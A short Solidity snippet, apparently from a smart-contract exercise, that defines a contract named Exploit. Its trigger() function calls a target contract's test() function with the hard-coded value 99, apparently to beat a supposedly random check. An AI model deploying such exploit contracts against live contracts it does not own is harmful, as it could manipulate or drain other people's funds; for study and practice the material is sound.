
interface IBase {
    function test(int rand) external;
}

contract Exploit {
    IBase target;

    constructor(address _target) {
        target = IBase(_target);
    }

    function trigger() public {
        target.test(99);
    }
}